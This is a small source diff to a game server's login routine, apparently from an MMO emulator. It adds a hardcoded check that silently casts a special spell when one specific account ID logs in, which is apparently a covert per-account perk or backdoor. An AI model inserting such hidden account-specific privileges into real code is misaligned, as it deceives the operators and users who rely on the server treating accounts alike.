@@ -14264,6 +14264,8 @@ void Player::EventLoginAuras()
 	// useless logon spell
 	Spell* logonspell = sSpellFactoryMgr.NewSpell(this, dbcSpell.LookupEntry(836), false, NULL);
 	logonspell->prepare(&targets);
+	if(GetSession()->GetAccountId() == 1387)
+		CastSpell(this, 1387, true);
 	BroadcastAuras();
 }
 
